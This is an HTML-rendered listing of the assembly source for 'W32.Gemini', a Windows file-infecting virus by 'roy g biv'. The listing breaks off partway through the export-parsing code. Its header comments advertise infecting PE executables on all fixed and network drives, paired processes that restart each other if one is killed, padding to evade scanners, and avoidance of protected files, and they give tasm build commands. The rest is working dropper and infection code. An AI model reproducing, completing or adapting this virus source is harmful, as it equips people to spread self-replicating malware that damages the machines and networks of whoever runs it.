<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>gemini.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment ;)</span><span class="sc0">
</span><span class="sc1">; W32.Gemini by roy g biv</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; some of its features:</span><span class="sc0">
</span><span class="sc1">; - parasitic resident (own process) infector of PE exe/dll (but not looking at suffix)</span><span class="sc0">
</span><span class="sc1">; - co-operative processes (if one process is killed, the other will restart it)</span><span class="sc0">
</span><span class="sc1">; - infects files in all directories on all fixed and network drives</span><span class="sc0">
</span><span class="sc1">; - directory traversal is linked-list instead of recursive to reduce stack size</span><span class="sc0">
</span><span class="sc1">; - reloc section inserter/last section appender</span><span class="sc0">
</span><span class="sc1">; - auto function type selection (Unicode under NT/2000/XP, ANSI under 9x/Me)</span><span class="sc0">
</span><span class="sc1">; - uses CRCs instead of API names</span><span class="sc0">
</span><span class="sc1">; - uses SEH for common code exit</span><span class="sc0">
</span><span class="sc1">; - section attributes are never altered (virus is not self-modifying)</span><span class="sc0">
</span><span class="sc1">; - no infect files with data outside of image (eg self-extractors)</span><span class="sc0">
</span><span class="sc1">; - infected files are padded by random amounts to confuse tail scanners</span><span class="sc0">
</span><span class="sc1">; - uses SEH walker to find kernel address (no hard-coded addresses)</span><span class="sc0">
</span><span class="sc1">; - correct file checksum without using imagehlp.dll :) 100% correct algorithm</span><span class="sc0">
</span><span class="sc1">; - plus some new code optimisations that were never seen before W32.EfishNC :)</span><span class="sc0">
</span><span class="sc1">; ---</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   optimisation tip: Windows appends ".dll" automatically, so this works:</span><span class="sc0">
</span><span class="sc1">;         push "cfs"</span><span class="sc0">
</span><span class="sc1">;         push esp</span><span class="sc0">
</span><span class="sc1">;         call LoadLibraryA</span><span class="sc0">
</span><span class="sc1">; ---</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; to build this thing:</span><span class="sc0">
</span><span class="sc1">; tasm</span><span class="sc0">
</span><span class="sc1">; ----</span><span class="sc0">
</span><span class="sc1">; tasm32 /ml /m3 gemini</span><span class="sc0">
</span><span class="sc1">; tlink32 /B:400000 /x gemini,,,import32</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Virus is not self-modifying, so no need to alter section attributes</span><span class="sc0">
</span><span class="sc1">; ---</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; We're in the middle of a phase transition:</span><span class="sc0">
</span><span class="sc1">; a butterfly flapping its wings at</span><span class="sc0">
</span><span class="sc1">; just the right moment could</span><span class="sc0">
</span><span class="sc1">; cause a storm to happen.</span><span class="sc0">
</span><span class="sc1">; -I'm trying to understand-</span><span class="sc0">
</span><span class="sc1">; I'm at a moment in my life-</span><span class="sc0">
</span><span class="sc1">; I don't know where to flap my wings.</span><span class="sc0">
</span><span class="sc1">; (Danny Hillis)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; (;</span><span class="sc0">

</span><span class="sc2">.486</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc0">

</span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc5">GetCurrentProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc5">WriteProcessMemory</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
</span><span class="sc9">extern</span><span class="sc0">  </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">

</span><span class="sc1">;must be reverse alphabetical order because they are stored on stack</span><span class="sc0">
</span><span class="sc1">;API names are not present in replications, only in dropper</span><span class="sc0">

</span><span class="sc5">expnames</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"WriteFile"</span><span class="sc0">           </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"WinExec"</span><span class="sc0">             </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SetFileAttributesA"</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"MoveFileA"</span><span class="sc0">           </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GlobalFree"</span><span class="sc0">          </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GlobalAlloc"</span><span class="sc0">         </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetWindowsDirectoryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetTickCount"</span><span class="sc0">        </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetTempFileNameA"</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetFileAttributesA"</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"DeleteFileA"</span><span class="sc0">         </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateFileA"</span><span class="sc0">         </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CloseHandle"</span><span class="sc0">         </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">krnnames</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"WaitForSingleObject"</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"UnmapViewOfFile"</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Sleep"</span><span class="sc0">               </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SetFileTime"</span><span class="sc0">         </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SetFileAttributesW"</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SetFileAttributesA"</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SetEvent"</span><span class="sc0">            </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SetCurrentDirectoryW"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ResetEvent"</span><span class="sc0">          </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"ReadProcessMemory"</span><span class="sc0">   </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"OpenProcess"</span><span class="sc0">         </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"OpenEventA"</span><span class="sc0">          </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"MultiByteToWideChar"</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"MapViewOfFile"</span><span class="sc0">       </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"LoadLibraryA"</span><span class="sc0">        </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GlobalFree"</span><span class="sc0">          </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GlobalAlloc"</span><span class="sc0">         </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetVersion"</span><span class="sc0">          </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetTickCount"</span><span class="sc0">        </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetStartupInfoA"</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetFullPathNameW"</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetFullPathNameA"</span><span class="sc0">    </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetDriveTypeA"</span><span class="sc0">       </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetCurrentProcessId"</span><span class="sc0"> </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"GetCommandLineA"</span><span class="sc0">     </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FindNextFileW"</span><span class="sc0">       </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FindNextFileA"</span><span class="sc0">       </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FindFirstFileW"</span><span class="sc0">      </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FindFirstFileA"</span><span class="sc0">      </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"FindClose"</span><span class="sc0">           </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateThread"</span><span class="sc0">        </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateProcessA"</span><span class="sc0">      </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateFileW"</span><span class="sc0">         </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateFileMappingA"</span><span class="sc0">  </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateFileA"</span><span class="sc0">         </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CreateEventA"</span><span class="sc0">        </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"CloseHandle"</span><span class="sc0">         </span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">sfcnames</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SfcIsFileProtected"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">exename</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc3">"gemini"</span><span class="sc0">                </span><span class="sc1">;must be &lt; 8 bytes long else code change</span><span class="sc0">

</span><span class="sc5">txttitle</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Gemini"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">txtbody</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"running..."</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">gemini.inc</span><span class="sc0">

</span><span class="sc5">patch_host</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_patch</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_patch</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteProcessMemory</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">gemini_inf</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;everything before this point is dropper code</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;virus code begins here in dropped exe</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">gemini_exe</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">walk_seh</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;API CRC table, null terminated</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">krncrcbegin</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;place &lt; 80h bytes from call for smaller code</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc4">(</span><span class="sc5">krncrc_count</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">krncrcend</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">swap_create</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">krncrcend</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Gemini - roy g biv"</span><span class="sc0">            </span><span class="sc1">;two heads are better than one</span><span class="sc0">

</span><span class="sc5">walk_seh</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">seh_loop</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">seh_loop</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;moved label after some data because "e800000000" looks like virus code ;)</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">init_findmz</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">find_mzhdr</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;do not use hard-coded kernel address values because it is not portable</span><span class="sc0">
</span><span class="sc1">;Microsoft used all different values for 95, 98, NT, 2000, Me, XP</span><span class="sc0">
</span><span class="sc1">;they will maybe change again for every new release</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">;sub 64kb</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                          </span><span class="sc1">;64kb align</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">is_pehdr</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_mzhdr</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;parse export table</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">pehdr.peexport.dirrva</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">pehdr.pecoff</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">peexp.expordbase</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;Ordinal Base</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;Export Address Table RVA</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;Name Pointer Table RVA</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;Ordinal Table RVA</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">push_export</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">get_export</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">lods</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">;Name Pointer VA</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">crc_outer</span><span class="sc0">       </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
